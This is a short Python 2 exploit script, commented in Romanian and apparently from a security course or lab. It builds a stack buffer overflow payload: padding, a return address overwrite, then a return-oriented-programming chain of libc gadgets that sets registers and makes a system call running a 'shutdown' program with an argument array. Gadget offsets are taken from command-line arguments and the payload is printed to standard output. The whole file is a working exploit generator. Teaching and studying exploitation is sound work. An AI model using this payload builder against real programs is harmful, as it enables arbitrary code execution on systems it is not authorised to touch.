#!/usr/bin/env python
from struct import pack
import sys

# Parsarea adreselor venite ca argumente
lib_base = int(sys.argv[4], 16)
syscall     = lib_base + int(sys.argv[9], 16)
zero_eax    = lib_base + int(sys.argv[5], 16)
set_eax     = lib_base + int(sys.argv[6], 16)
pop_ecx_ebx = lib_base + int(sys.argv[7], 16)
pop_edx     = lib_base + int(sys.argv[8], 16)
shutdown_loc   = int(sys.argv[2],16)
argarray_loc = int(sys.argv[3],16)


# Umplerea buffer-ului
p = 'A'*int(sys.argv[1])
# Suprascrierea adresei de revenire a functiei
p += 'BBBB'

# Inlantuirea corecta a gadget-urilor si impachetarea adreselor acestora sub forma de intregi fara semn in formatul little endian
p += pack('<I', pop_edx)
p += pack('<I', 0x0)
p += pack('<I', pop_ecx_ebx)
p += pack('<I', argarray_loc)
p += pack('<I', shutdown_loc)
p += pack('<I', zero_eax)
p += pack('<I', set_eax)
p += pack('<I', syscall)

# Scrierea incarcaturii la iesirea standard
print p

